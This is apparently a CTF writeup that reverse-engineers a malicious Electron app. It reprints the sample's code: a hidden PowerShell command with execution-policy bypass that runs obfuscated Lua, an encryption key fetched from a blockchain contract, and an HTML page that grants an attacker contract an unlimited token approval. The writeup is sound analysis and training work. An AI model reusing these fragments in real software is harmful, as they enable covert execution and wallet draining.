---
title: HTB Holmes CTF 2026 - SilentDividend Writeup
published: 2026-10-03
tags: [Holmes CTF 2026, Writeups]
category: Writeups
draft: false
---

# SilentDividend — Easy

Here's the attachments in the challenge

```
Holmes CTF 2026 Sherlock 01.pdf
DANGER.txt
danger.zip
TrustSettle 1.0.0.exe
```

The DANGER.txt told me that this is a very dangerous malware and it might interact with my computer and files. I used my VM (as I always do) to solve the challenge so I didn't have to worry much about this.

Let's move on. After unziping the file with the password from DANGER.txt. I got these

```
README.md 
TrustSettle 1.0.0.exe
```

It didn't say much in the README, so I started extracting it.

```
7z x 'TrustSettle 1.0.0.exe'
7z x app-64.7z
npx @electron/asar extract resources/app.asar asar_out
```

After extraction, I got these:

```
TrustSettle 1.0.0.exe
└── app-64.7z
    ├── extraResources/
    │   ├── api.txt
    │   ├── lua51.dll
    │   └── luajit.exe
    └── resources/app.asar
        ├── main.js
        ├── preload.js
        ├── package.json
        ├── node_modules/
        │   └── ethers/
        └── src/
            └── settlement.html
```

I started with `main.js`.

Nothing there really helped, but it called preload.js, so I moved on to `preload.js`.

---

The first thing that caught my attention was this:

```
fs.readdirSync(
    path.resolve(`${process.resourcesPath}/../extraResources`)
).forEach(
    f => fs.copyFileSync(
        path.resolve(`${process.resourcesPath}/../extraResources`, f),
        path.join('C:\\Users\\Public', f)
    )
);
```

This was pretty straightforward.

The application was taking everything from `extraResources` and copying it into:

```
C:\Users\Public
```

That gave me the first flag.

**Q1: `C:\Users\Public`**

There wasn't really much reverse engineering involved here. The code was basically telling me the answer directly.

I kept reading the code after.

A few lines later, I found this:

```
exec(
    "powershell.exe -exec bypass -w hidden -nop -c \"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\""
);
```

The api.txt wasn't being opened as a text file, it was being **executed as Lua**.

And the PowerShell command was also being launched with:

```
-exec bypass   -> Bypass script execution restrictions
-w hidden      -> Hide the window
-nop           -> Do not load configuration
```

All these are just trying to not be found.

At this point I knew that `api.txt` was going to be important, but I wanted to finish reading this script first. So I put that in my note.

---

Further down, I found these:

```
const CONTRACT_ADDRESS =
    '0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1';

const RPC_URL =
    'https://ethereum-sepolia-rpc.publicnode.com';

const CONTRACT_ABI = [
    'function resolveState() view returns (bytes32)'
];

const ENCRYPTED_DATA =
    '0x560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa2c4c4e1bbfc6204207fe5c801d201f5af84864f0';
```

These are blockchain components. I could check the contract with the url and address. I put that on my note, I'll check it after reading this script.

Then I found the decryption function.

```
function decryptEmbeddedData(
    encryptedData,
    encryptionKey
) {
    const magicConstant = 0x42;
    const rotationBits = 7;

    ...

    for (let i = 0; i < data.length; i++) {
        const keyByte = key[i % key.length];
        const step1 = data[i] ^ keyByte;

        const step2 =
            ((step1 << rotationBits) |
             (step1 >>> (8 - rotationBits))) & 0xff;

        result[i] = step2 ^ magicConstant;
    }

    return result.toString('utf8');
}
```

I didn't understand the full thing because I'm not really good at Crypto. But I could tell that this function take a encrypted data and a key to decrypt.

These problem was I didn't know where the key came from.

So again, I kept going.

The next function was `computeHash()`, but that was just SHA-256:

Nothing particularly exciting there.

Then I reached `queryRemoteState()`.

```
async function queryRemoteState() {
    if (!ethers.isAddress(CONTRACT_ADDRESS)) {
        throw new Error('Invalid contract address');
    }

    const provider =
        new ethers.JsonRpcProvider(RPC_URL);

    const code =
        await provider.getCode(CONTRACT_ADDRESS);

    if (code === '0x') {
        throw new Error('No contract found at configured address');
    }

    const contract =
        new ethers.Contract(
            CONTRACT_ADDRESS,
            CONTRACT_ABI,
            provider
        );

    const state =
        await contract.resolveState();

    return state;
}
```

Now I could see what the application was doing.

It checked the contract address, connected to Sepolia, verified that there was actually a contract there, created an `ethers.Contract`, and finally called:

```
resolveState()
```

I suspected this was probably flag to Q4 but I still wanted to see how `state` was actually used.

I kept going, and it proved I was right in the next function.

In `initializeVault()`

```
const state =
    await queryRemoteState();

remoteState =
    state;

const decrypted =
    decryptEmbeddedData(
        ENCRYPTED_DATA,
        state
    );

evidenceCache =
    decrypted;
```

The value returned by `resolveState()` wasn't just some random blockchain state. It was passed directly into:

```
decryptEmbeddedData(ENCRYPTED_DATA, state)
```

So `state` was the decryption key.

And I got the second flag

**Q4: `resolveState()`**

---

I read the whole script and there wasn't anything else important, so I decided to go read the contract

I took the contract address and went to this url:

```
https://sepolia.etherscan.io/address/0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1
```

Because the ABI had already told me exactly what function I wanted, I went to:

```
Contract → Read Contract → resolveState
```

The contract returned:

```
0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4
```

Now I had the key.

The JavaScript had already given me the decryption algorithm, so I decided to reproduce it in Python.

```
encrypted = bytes.fromhex(
    "560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca"
    "8f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74c"
    "fa2c4c4e1bbfc6204207fe5c801d201f5af84864f0"
)

key = bytes.fromhex(
    "3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4"
)

result = bytearray()

for i, c in enumerate(encrypted):
    key_byte = key[i % len(key)]

    step1 = c ^ key_byte
    step2 = ((step1 << 7) | (step1 >> 1)) & 0xff

    result.append(step2 ^ 0x42)

print(result.decode("utf-8"))
```

And it gave me:

```
start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

The encrypted blob had turned into an actual Windows command.

It also gave me two more flags:

**Q5: `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`**

and:

**Q6: `%TEMP%`**

More importantly, I now had another file to investigate.

---

I opened `settlement.html`.

I didn't spend much time on the HTML itself. The important part was clearly the JavaScript inside the `<script>` tag.

Near the beginning, I found:

```
const X0_CONTRACT_ADDRESS =
    "0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D";

const MOCK_TOKEN_ADDRESS =
    "0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2";
```

These was another interesting contract!

But before jumping into it, I continued reading the JavaScript.

The token ABI contained:

```
{
    "name": "approve",
    "outputs": [
        {
            "internalType": "bool",
            "name": "",
            "type": "bool"
        }
    ],
    "stateMutability": "nonpayable",
    "type": "function"
}
```

`approve()` looked like the flag to Q7 because it asked for permissions.

I kept reading and tried to find where it got called.

But I found the flag to Q9 even before this.

```
provider = new ethers.BrowserProvider(window.ethereum);
```

So:

**Q9: `BrowserProvider`**

As I moved on I found both the Q7 and Q8 at the end of the script

```
const tx = await token.approve(
    X0_CONTRACT_ADDRESS,
    unlimitedAmount
);
```

That confirmed flag.

**Q7: `approve()`**

And right above it was:

```
const unlimitedAmount = ethers.MaxUint256;
```

which is:

```
2^256 - 1
```

So:

**Q8: `115792089237316195423570985008687907853269984665640564039457584007913129639935`**

At this point, I found the most the flags.

Only three questions were still sitting there:

```
Q2
Q3
Q10
```

I knew I could definitely find something in the api.txt, but check the contract is relatively easy at this point

---

I went to

```
https://sepolia.etherscan.io/address/0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D
```

I opened its source code and looked at what each function actually did.

There are only three functions that returned a value and only x9 returning a `string`. So it was the only possible function that gave me the Q10 flag.

```
function x9(address x10)
    external
    view
    returns (string memory)
{
    require(
        x10 == x7(),
        "not quite - keep analyzing"
    );

    bytes memory decrypted =
        _crypt(x4, x10);

    return string(decrypted);
}
```

I couldn't call it without the x10, but I could find it in the return value of x7.

I went to Read Contract and check the return value of x7.

The result was:

```
0xEBfC1eD96b1C6b940fb6B06359fF4A6776Df7a9A
```

So I passed it to `x9()`.

The result was:

```
51.5049,0.0348
```

That gave me:

**Q10: `51.5049,0.0348`**

Now there were only two flags left.

---

I finally went back to the api.txt.

At this point, I already knew that it was Lua code being executed through LuaJIT.

The problem was that it was obfuscated so I wasn't able to read it.

Obfuscation only hid things statically. To call Windows APIs, the script must pass plaintext C declarations to `ffi.cdef` at runtime.

So I ran it in a Lua 5.1 sandbox where `ffi`, `bit`, `io` and `os` are fakes that log every call instead of performing it.

```
local log = io.open("trace.txt", "w")
local n = 0

local function mkproxy(name)
    local t = {}
    return setmetatable(t, {
        __index    = function(_, k)
            log:write("INDEX " .. name .. "." .. tostring(k) .. "\n"); log:flush()
            return mkproxy(name .. "." .. tostring(k))
        end,
        __newindex = function(_, k, v)
            log:write("SET " .. name .. "." .. tostring(k) .. "=" .. tostring(v) .. "\n"); log:flush()
        end,
        __call     = function(_, ...)
            n = n + 1
            local args = {...}
            local parts = {}
            for i = 1, #args do
                parts[i] = type(args[i]) == "string"
                    and string.format("%q", args[i])
                    or tostring(args[i])
            end
            local line = name .. "(" .. table.concat(parts, ", ") .. ")\n"
            log:write(line); log:flush()
            if n > 50000 then log:write("LIMIT\n"); log:close(); os.exit(0) end
            return mkproxy(name .. "()")
        end,
        __tostring = function() return "<" .. name .. ">" end,
        __concat   = function(a, b) return tostring(a) .. tostring(b) end,
        __len      = function() return 0 end,
        __add      = function(a, b) return type(a)=="number" and a or 0 end,
        __sub      = function(a, b) return 0 end,
        __lt       = function() return false end,
        __le       = function() return false end,
        __eq       = function() return false end,
    })
end

local env = {}
for k, v in pairs(_G) do env[k] = v end

env.getfenv = function() return env end
env.setfenv = function(f, t) return f end

env.require = function(m)
    log:write("require(" .. tostring(m) .. ")\n"); log:flush()
    if m == "ffi" then
        return {
            cdef   = function(s)
                log:write("ffi.cdef:\n" .. tostring(s) .. "\n"); log:flush()
            end,
            load   = function(libname)
                return mkproxy("LIB:" .. tostring(libname))
            end,
            new    = function(t, sz)
                log:write("ffi.new(" .. tostring(t) .. ")\n"); log:flush()
                if t == "DWORD[1]" then return {[0]=64} end
                return mkproxy("CDATA:" .. tostring(t))
            end,
            cast   = function(t, v)
                return mkproxy("CAST:" .. tostring(t))
            end,
            string = function(p, l)
                log:write("ffi.string(" .. tostring(p) .. "," .. tostring(l) .. ")\n"); log:flush()
                return ".env"
            end,
            sizeof = function(t) return 12 end,
            copy   = function() end,
            fill   = function() end,
            C      = mkproxy("ffi.C"),
        }
    elseif m == "bit" then
        return {
            bor    = function(a, b) return (a or 0) + (b or 0) end,
            band   = function(a, b) return 0 end,
            bxor   = function(a, b) return 0 end,
            rshift = function(a, b) return 0 end,
            lshift = function(a, b) return 0 end,
            tobit  = function(a) return a end,
        }
    end
    return mkproxy("MOD:" .. tostring(m))
end

env.os = {
    time   = os.time, clock = os.clock, date = os.date,
    getenv = function(k)
        log:write("os.getenv(" .. tostring(k) .. ")\n"); log:flush()
        return "C:\\Users\\Public"
    end,
    exit   = function() log:close(); os.exit(0) end,
}

env.io = {
    open = function(p, m)
        log:write("io.open(" .. tostring(p) .. ", " .. tostring(m) .. ")\n"); log:flush()
        local lines = {
            "PRIVATE_KEY=0x" .. string.rep("a", 64),
            "WALLET_ADDRESS=0x" .. string.rep("b", 40),
            "RPC_URL=https://rpc.example/",
        }
        local i = 0
        return {
            lines = function() return function() i=i+1; return lines[i] end end,
            read  = function() return table.concat(lines, "\n") end,
            close = function() end,
        }
    end,
    write = function(...) log:write("io.write(" .. tostring((...)) .. ")\n"); log:flush() end,
}

setmetatable(env, {
    __index    = function(_, k)
        log:write("GLOBAL " .. tostring(k) .. "\n"); log:flush()
        return nil
    end,
    __newindex = function(t, k, v)
        log:write("SETGLOBAL " .. tostring(k) .. "\n"); log:flush()
        rawset(t, k, v)
    end,
})

local f = assert(loadfile("extraResources/api.txt"))
setfenv(f, env)
local ok, err = pcall(f)
log:write("DONE ok=" .. tostring(ok) .. " err=" .. tostring(err) .. "\n")
log:close()
```

I ran it with

```
timeout 60 lua5.1 sandbox.lua
```

Among the runtime trace, I found declarations for a number of Windows APIs:

```
HINTERNET WinHttpOpen(...);

HINTERNET WinHttpConnect(...);

HINTERNET WinHttpOpenRequest(...);

BOOL WinHttpSendRequest(...);

BOOL WinHttpReceiveResponse(...);

BOOL WinHttpQueryDataAvailable(...);

BOOL WinHttpReadData(...);

BOOL WinHttpCloseHandle(...);
```

And then I found:

```
BOOL ReadDirectoryChangesW(...);

typedef struct {
    DWORD NextEntryOffset;
    DWORD Action;
    DWORD FileNameLength;
    WCHAR FileName[1];
} FILE_NOTIFY_INFORMATION;
```

I finally found the two last flags

`WinHttpSendRequest` was the HTTP request-sending API.

`FILE_NOTIFY_INFORMATION` was the directory-change notification structure.

So:

**Q2: `FILE_NOTIFY_INFORMATION`**

**Q3: `WinHttpSendRequest`**

I finally complete the challenge

---

# Final Answers

| Question | Answer                                                                           |
| -------- | -------------------------------------------------------------------------------- |
| Q1       | `C:\Users\Public`                                                                |
| Q2       | `FILE_NOTIFY_INFORMATION`                                                        |
| Q3       | `WinHttpSendRequest`                                                             |
| Q4       | `resolveState()`                                                                 |
| Q5       | `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`                                     |
| Q6       | `%TEMP%\settlement.html`                                                         |
| Q7       | `approve()`                                                                      |
| Q8       | `115792089237316195423570985008687907853269984665640564039457584007913129639935` |
| Q9       | `BrowserProvider`                                                                |
| Q10      | `51.5049,0.0348`                                                                 |

---

> AI used: I used AI to write the lua script and analyze the decryption function because I didn't know how to do it. after the CTF I spent so much time on learning about them and I now can fully understand them and all the stuff in this writeup.

